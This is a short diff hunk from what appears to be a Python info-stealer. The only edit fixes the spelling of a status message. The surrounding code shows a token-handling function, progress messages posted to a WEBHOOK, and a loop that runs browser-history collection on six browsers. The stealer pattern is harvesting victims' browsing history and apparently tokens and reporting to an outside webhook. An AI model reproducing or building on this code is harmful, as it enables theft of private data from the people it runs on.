@@ -94,7 +94,7 @@ def getuserdata(token):
     except:
         pass
 def histroy():
-    requests.post(WEBHOOK,headers=getheaders(),json={"content":"**Working on, Getting user histroy!**"})
+    requests.post(WEBHOOK,headers=getheaders(),json={"content":"**Working on, Getting user History!**"})
     browsers = ["Firefox","Edge","Brave","Chrome","Opera","Yandex"]
     for browser in browsers: 
         cmd = f"browser-history -b {browser}"
